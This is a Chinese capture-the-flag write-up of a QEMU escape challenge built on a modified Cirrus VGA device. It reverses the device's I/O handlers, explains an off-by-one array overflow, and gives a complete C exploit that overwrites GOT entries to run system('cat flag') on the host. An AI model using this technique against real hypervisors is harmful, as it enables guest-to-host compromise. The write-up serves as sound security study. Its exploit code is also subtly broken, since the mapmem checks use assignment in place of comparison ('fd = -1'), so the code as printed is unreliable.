这题先按照正常步骤起手，run.sh里寻找设备，ida里找到对应的class_init，找到对应的vender_id和device_id，可得知其是00:04.0 Class 0300: 1013:00b8

![image-20201022205527057](https://gitee.com/zhzzhz/blog_warehouse/raw/master/img/image-20201022205527057.png)

![image-20201022205442671](https://gitee.com/zhzzhz/blog_warehouse/raw/master/img/image-20201022205442671.png)

因为习惯性的先看了几眼WP，发现人家一眼就看出了这是魔改原有设备的，所以好奇怎么做到的，就自行探究了一番。结论是：

1. 先在`xxx_class_init`函数里查看它对应的在qemu中的源码路径

   ![image-20201022213041554](https://gitee.com/zhzzhz/blog_warehouse/raw/master/img/image-20201022213041554.png)

   在源码里面跟踪一下，发现没有这个**cydf_vga.c**文件

2. 再利用字符串特征值![image-20201022213156556](https://gitee.com/zhzzhz/blog_warehouse/raw/master/img/image-20201022213156556.png)

   可以在/display路径下去寻找，因为多此出现关键字VGA，这个很可疑，以此为依据找到了原本的源码函数`cirrus_vga.c`

然后进入虚拟机里继续去查看对应的设备信息，发现有三个MMIO空间

![image-20201022213507701](https://gitee.com/zhzzhz/blog_warehouse/raw/master/img/image-20201022213507701.png)

但是有个较奇怪的问题是，在`cydf_init_common`函数里，我们发现它注册了三个I/O函数，一个大小为0x30的PMIO，一个大小为0x20000的MMIO，一个大小为0x1000的PMIO

```c
memory_region_init_io(&s->cydf_vga_io, owner, &cydf_vga_io_ops, s, "cydf-io", 0x30uLL);
memory_region_init_io(&s->low_mem, owner, &cydf_vga_mem_ops, s, "cydf-low-memory", 0x20000uLL);
memory_region_init_io(&s->cydf_mmio_io, owner, &cydf_mmio_io_ops, s, "cydf-mmio", 0x1000uLL);
```

但是我们只在resource中发现了对应的一个大小为0x20000的MMIO，剩下的两个在哪里呢。

这里就先插入一点额外的知识：

- ```
  VGA是一种视频显示控制器和图形标准。
  
  VGA的视频存储器通过窗口映射到PC的实模式地址空间中段**0xA0000**和**0xBFFFF**之间的窗口（段：偏移表示法中的A000：0000和B000：FFFF）。通常，这些起始段是：
  
  - 用于EGA / VGA图形模式的0xA0000（64 [KB](https://en.wikipedia.org/wiki/Kibibyte)）
  - 单色文本模式为0xB0000（32 KB）
  - 用于彩色文本模式和CGA兼容图形模式的0xB8000（32 KB）
  ```

  前面的可疑字符VGA代表的就是这上面介绍的视频显示监控器设备，这里也不去探究VGA编程，因为我没去看......

在了解到这个知识后，我们用`cat /proc/iomem`和`cat /proc/ioports`命令来查看MMIO和PMIO，发现

```
/ # cat /proc/iomem
...
000a0000-000bffff : PCI Bus 0000:00 // 这里就是上面所显示的VGA的视频存储器映射到PC的实模式地址空间中段，对应分配的0x20000
...
04000000-febfffff : PCI Bus 0000:00
...
  febc1000-febc1fff : 0000:00:04.0 // 对应分配的0x1000

/ # cat /proc/ioports
...
  03c0-03df : vga+
...
```

 至于最后一个0x30的PMIO，就借助了源码的注释了，不然还真不知道怎么找，也就对应着上面的03c0-03df : vga+

```c
     /* Register ioport 0x3b0 - 0x3df */
     memory_region_init_io(&s->cirrus_vga_io, owner, &cirrus_vga_io_ops, s,
                           "cirrus-io", 0x30);
     memory_region_set_flush_coalesced(&s->cirrus_vga_io);
     memory_region_add_subregion(system_io, 0x3b0, &s->cirrus_vga_io);
```

我们再回到那三个`memory_region_init_io`函数，后面两个`memory_region_init_io`函数中，分别有不同的ops结构体，也对应着不同的write和read函数。因为我们已经知道了这题其实是魔改的`cirrus_vga.c`，所以我们可以直接对着源码来看伪c代码，观察究竟是哪里进行了修改

先来看结构体：

多了这么个可疑的东西

```
000133D8 vs              VulnState_0 16 dup(?)

00000000 VulnState_0     struc ; (sizeof=0x10, align=0x8, copyof_4201)
00000000                                         ; XREF: CydfVGAState_0/r
00000000                                         ; CydfVGAState/r
00000000 buf             dq ?                    ; offset
00000008 max_size        dd ?
0000000C cur_size        dd ?
00000010 VulnState_0     ends
```

`cydf_vga_mem_write`函数：

前面略过不谈，主要是多了addr 在[0x10000，0x18000]地址范围内的处理，然后开始逆向......

```c
void __fastcall cydf_vga_mem_write(CydfVGAState *opaque, hwaddr addr, uint64_t mem_value, uint32_t size)
{    
......
else
  {
    v6 = 0xCD * opaque->vga.sr[0xCC];
    LOWORD(v6) = opaque->vga.sr[0xCC] / 5u;
    cmd = opaque->vga.sr[0xCC] - 5 * v6; // cmd = opaqeu->vga.sr[0xcc]
    if ( *(_WORD *)&opaque->vga.sr[0xCD] )
     （字，16位） LODWORD(mem_value) = (opaque->vga.sr[0xCD] << 16) | (opaque->vga.sr[0xCE] << 8) | mem_value;
    if ( (_BYTE)cmd == 2 )  // cmd = 2
    {
      idx = BYTE2(mem_value); // idx = opaqeu->vga.sr[0xcd]
      if ( idx <= 0x10 && *((_QWORD *)&opaque->vga.vram_ptr + 2 * (idx + 0x133D)) )
        __printf_chk(1LL);
    }
    else
    {
      if ( (unsigned __int8)cmd <= 2u )
      {
        if ( (_BYTE)cmd == 1 ) // cmd = 1
        {
          if ( BYTE2(mem_value) > 0x10uLL )
            return;
          v8 = (char *)opaque + 16 * BYTE2(mem_value);
          v9 = *((_QWORD *)v8 + 0x267B);
          if ( !v9 ) // if (opaque->vs[idx].buf)
            return;
          cur_size = *((unsigned int *)v8 + 0x4CF9); // cur_size = opaque->vs[idx].cur_size
          if ( (unsigned int)cur_size >= *((_DWORD *)v8 + 0x4CF8) )
              // if (cur_size > opaque->vs[idx].max_size）
            return;
LABEL_26:
          *((_DWORD *)v8 + 0x4CF9) = cur_size + 1;
          *(_BYTE *)(v9 + cur_size) = mem_value; // buf[cur_size] = mem_value
          return;
        }
        goto LABEL_35;
      }
      if ( (_BYTE)cmd != 3 )
      {
        if ( (_BYTE)cmd == 4 ) // cmd = 4
        {
          if ( BYTE2(mem_value) > 0x10uLL )
            return;
          v8 = (char *)opaque + 16 * BYTE2(mem_value);
          v9 = *((_QWORD *)v8 + 9851);
          if ( !v9 )
            return;
          v10 = *((unsigned int *)v8 + 19705);
          if ( (unsigned int)v10 > 0xFFF )
            return;
          goto LABEL_26;
        }
LABEL_35:
        v20 = vulncnt;
        if ( vulncnt <= 0x10 && (unsigned __int16)mem_value <= 0x1000uLL )// cmd == 0
        {
          mem_valuea = mem_value;
          v21 = malloc((unsigned __int16)mem_value);
          v22 = (char *)opaque + 0x10 * v20;
          *((_QWORD *)v22 + 0x267B) = v21; // opaque->vs[vulncnt].max_size = buf
          if ( v21 )
          {
            vulncnt = v20 + 1;
            *((_DWORD *)v22 + 19704) = mem_valuea;
          }
        }
        return;
      }
      if ( BYTE2(mem_value) <= 0x10uLL ) // cmd = 3
      {
        v23 = (char *)opaque + 16 * BYTE2(mem_value);
        if ( *((_QWORD *)v23 + 9851) )
        {
          if ( (unsigned __int16)mem_value <= 0x1000u )
            *((_QWORD *)v23 + 9852) = (unsigned __int16)mem_value;
            // opaque->vs[idx].max_size = mem_value
        }
      }
    }
  }
}
```

总结一下：

​		cur_size就是当前内存中已储存的内容的size

1. 当cmd = 0时，mem_value <= 0x1000时，malloc出`mem_value`大小的堆块，放在`vs[vulncnt].buf`中，并且将对应的`vs[vulncnt].max_size`设置为mem_value
2. 当cmd = 1时，设置对应的opaque->vs[idx].cur_size = opaque->vs[idx].cur_size + 1，再设置opaque->vs[idx].buf[cur_size] = mem_value
3. 当cmd = 2时，printf_chk（1，vs[idx].buf）
4. 当cmd = 3时，mem_value <= 0x1000时，设置opaque->vs[idx].max_size = mem_value
5. 当cmd = 4时，cur_size <= 0xFFF时，opaque->vs[idx].buf[cur_size++] = mem_value

漏洞点在

```c
if ( vulncnt <= 0x10 && (unsigned __int16)mem_value <= 0x1000uLL )// cmd == 0
```

因为vs大小只有16，最大就是vs[0xf]，但是这里可以寻址到vs[0x10]，vs[0x10]就是后面的latch[0]，会越界访问。

还有要解决的问题就是如何触发漏洞代码。除了`addr`之外，还需要使得`(opaque->vga.sr[7]&1 ==1)`以绕过前面的`if`判断、设置`opaque->vga.sr[0xCC]`来设置cmd以及设置`opaque->vga.sr[0xCD]`设置idx。

在代码中可以找到`cydf_vga_ioport_write`函数中可以设置`opaque->vga.sr`。`addr`为`0x3C4`，`vulue`为`vga.sr`的`index`；当`addr`为`0x3C5`时，`vga.sr[index]`的值可被设置成`value`。从而可以通过`cydf_vga_ioport_write`设置`vga.sr[7]`、`vga.sr[0xCC]`以及`vga.sr[0xCD]`。

```c
void __fastcall cydf_vga_ioport_write(CydfVGAState *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
      ......
	  case 0x3C4uLL:
        opaque->vga.sr_index = v4; // 设定vga.sr_index的值
        break;
      case 0x3C5uLL:
        v10 = opaque->vga.sr_index;
        switch ( (_BYTE)v10 )
        {
          case 0:
          case 1:
          case 2:
          case 3:
          case 4:
            opaque->vga.sr[(unsigned __int8)v10] = sr_mask[(unsigned __int8)v10] & v4;
            if ( (_BYTE)v10 == 1 )
              goto LABEL_35;
            break;
          case 6:
            opaque->vga.sr[6] = 3 * ((v4 & 0x17) == 18) + 15;
            break;
          case 7:  // 设置vga.sr[index] = value
            cydf_update_memory_access(opaque);
            v10 = opaque->vga.sr_index;
            goto LABEL_28;
		......
LABEL_28:
            opaque->vga.sr[v10] = v4;
            break;
		......
          case 0xF0:
            opaque->vga.sr[16] = v4;
            opaque->vga.hw_cursor_x = ((unsigned __int8)v10 >> 5) | 8 * v4;
            break;
		  ......
        }
        break;
```

这里有两种办法去调用`cydf_vga_ioport_write`：

一是访问`febc1000-febc1fff`地址空间，触发`cydf_mmio_write`从而实现对 `cydf_vga_ioport_write`的调用。（我们使用的是这种）

```c
void __fastcall cydf_mmio_write(CydfVGAState *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
  if ( addr > 0xFF )
    cydf_mmio_blt_write(opaque, addr - 0x100, val);
  else
    cydf_vga_ioport_write(opaque, addr + 0x10, val, size);
}
```

二是利用PMIO，out类指令以及in类指令直接对相应的0x3b0 - 0x3df端口进行访问

还需要说明的是可以通过`cydf_vga_mem_read`函数来设置`opaque->latch[0]`，`latch[0]`刚好是`vs`越界访问到的元素。

```c
uint64_t __fastcall cydf_vga_mem_read(CydfVGAState *opaque, hwaddr addr, uint32_t size)
{
  uint32_t v3; // eax
  bool v4; // zf
  uint64_t result; // rax
  char *v6; // rcx
  unsigned int v7; // edx
  int v8; // edx

  v3 = opaque->latch[0];
  if ( !(_WORD)v3 ) // 注意此处，是!(word)v3，也就是说检测是以字（16位，2个字节）为单位
  {
    v4 = (opaque->vga.sr[7] & 1) == 0;
    opaque->latch[0] = addr | v3;
    if ( !v4 )
      goto LABEL_3;
    return vga_mem_readb(&opaque->vga, addr);
  }
  v4 = (opaque->vga.sr[7] & 1) == 0;
  opaque->latch[0] = (_DWORD)addr << 16;
}
```

### 利用

1. 利用`cydf_vga_mem_read`函数来设置opaque->latch[0]，将其设置为bss段，从而为vs[0x10]创建一个指针（以绕过检测）
2. 在bss段里面写入cat flag
3. 把bss段地址写入qemu_logfile
4. 把vfprintf函数的got表覆盖为system函数的plt地址
5. 把printf_chk函数got表覆盖为qemu_log函数的地址
6. 利用cmd为2时，触发`printf_chk`，最终实现system函数的调用，同时参数也可控。

```c
//
// Created by zhz on 2020/10/23.
//
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>

size_t mmio_addr = 0xfebc1000;
size_t mmio_size = 0x1000;
size_t vga_addr = 0xa0000;
size_t vga_size = 0x20000;

unsigned char *mmio_ptr = 0;
unsigned char *vga_ptr = 0;

void* mapmem(const char* dev, size_t offset, size_t size)
{
    int fd = open(dev,O_RDWR | O_SYNC);
    if (fd = -1)
    {
        printf("open failed!");
        exit(-1);
    }

    void* result = mmap(0,size,PROT_READ | PROT_WRITE,MAP_SHARED,fd,offset);
    if (result = -1)
    {
        printf("mmap failed!");
        exit(-1);
    }

    close(fd);
    return result;
}

unsigned char vga_mem_read(unsigned int addr)
{
    return vga_ptr[addr];
}

void vga_mem_write(unsigned char addr, unsigned char value)
{
    vga_ptr[addr] = value;
}

void SR(unsigned char index, unsigned char value)
{
    mmio_ptr[4] = index;
    mmio_ptr[5] = value;
}

int main(int argv, char** args)
{
    // 用来访问物理内存
    system( "mknod -m 660 /dev/mem c 1 1" );
	// 与mmio空间进行映射
    mmio_ptr = mapmem("/dev/mem",mmio_addr,mmio_size);
    if (!mmio_ptr)
        return 1;
	// 与io空间进行映射
    vga_ptr = mapmem("/dev/mem",vga_addr,vga_size);
    if (!vga_ptr)
        return 1;

    unsigned char payload[64] = {};
    strcpy(payload,"cat flag");
	// 先将1写入，使得后面能先将高地址写入
    vga_mem_read(1);
    // 此处是将0xf6a3c0当作opaque->vs[idx].buf的地址，即latch[0]里面的指针指向0xf6a3c0
    // 写入高地址，即0xf60000
    vga_mem_read((0xf6a3c0 >> 16));
    // 写入低地址，即0xa3c0
    vga_mem_read(0xf6a3c0 & 0xffff);
    
    // 设定opaque->vga.sr[7]=1，使得(opaque->vga.sr[7]&1 ==1)以绕过前面的`if`判断
    SR(7,1);
    // cmd = 4
    SR(0xcc,4);
    // idx = 16
    SR(0xcd,16);   
    // 将payload逐字节的写入latch[0]指向的地址，即0xf6a3c0。这里说明一点，cmd = 4执行的是opaque->vs[idx].buf[cur_size++] = mem_value，opaque->vs[0x10]实际上就是latch[0]，opaque->vs[idx].buf是自动将latch[0]里面的内容当作指针来识别，所以内容是直接写在0xf6a3c0地址上的
    for ( int i = 0; i < 8; i++ ) {
        vga_mem_write( 0x10000, payload[i] );
    }
    
    *(size_t*)&payload[0] = 0xf6a3c0;
    // 将latch[0]重新指向0x10ccBE0，这个地址是vfprintf函数第一个参数
    vga_mem_read( ( 0x10CCBE0 - 8 >> 16 ) );
    vga_mem_read( 0x10CCBE0 - 8 & 0xffff );
    // 使得第一个参数指向0xf6a3c0，即cat flag
    for ( int i = 0; i < sizeof( size_t ); i++ ) {
        vga_mem_write( 0x10000, payload[i] );
    }
    
    *(size_t*)&payload[0] = 0x409DD0;
    // 将latch[0]重新指向0xee7bb0, 这个地址是vfprintf@GOT
    vga_mem_read( ( 0xee7bb0 - 0x10 >> 16 ) );
    vga_mem_read( 0xee7bb0 - 0x10 & 0xffff );

    // overwrite vfprintf@GOT with system@PLT (0x409DD0)
    for ( int i = 0; i < sizeof( size_t ); i++ ) {
        vga_mem_write( 0x10000, payload[i] );
    }
    
    *(size_t*)&payload[0] = 0x9726E8;
    // 将latch[0]重新指向0xee7028, 这个地址是__printf_chk@GOT
    vga_mem_read( ( 0xee7028 - 0x18 >> 16 ) );
    vga_mem_read( 0xee7028 - 0x18 & 0xffff );
    // 把__printf_chk@GOT里的地址改写成qemu_log函数(0x9726E8)
    for ( int i = 0; i < sizeof( size_t ); i++ ) {
        vga_mem_write( 0x10000, payload[i] );
    }
    
    // cmd = 2，调用__printf_chk
    SR( 0xcc, 2 );
    // 调用__printf_chk，因为__printf_chk@got被我们改为qemu_log，所以实际上是调用qemu_log，然后去调用qemu_log里面的vfprintf，因为vfprintf@GOT被我们改为system@plt，第一个参数改为了cat flag，所以执行了system("cat flag")
    vga_mem_write( 0x10000, 0 );
}
```

